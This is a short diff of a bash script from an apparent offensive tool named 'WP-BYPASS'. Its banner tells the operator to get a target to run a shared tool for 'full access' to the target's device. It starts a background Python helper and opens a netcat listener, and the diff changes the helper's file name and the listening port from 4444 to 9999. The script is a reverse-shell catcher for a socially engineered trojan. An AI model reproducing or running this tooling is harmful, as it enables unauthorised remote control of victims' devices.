@@ -41,8 +41,8 @@ wan() {
   echo -e "${green}CoDeD By ${red}${bold}Anonym0us R47${reset}"
   echo -e "${green}[i]${red} Share WP-BYPASS Folder To Target and Target Run That Tool To get Full Access To That Target Device${reset}"
   echo -e "${red}[!]${green} Dont Stop this ${reset}"
-  python sshreachme.py yt > /dev/null 2>&1 & sleep 1
-  nc -nlvp 4444
+  python 1.py yt > /dev/null 2>&1 & sleep 1
+  nc -nlvp 9999
 
 }
 lan() {
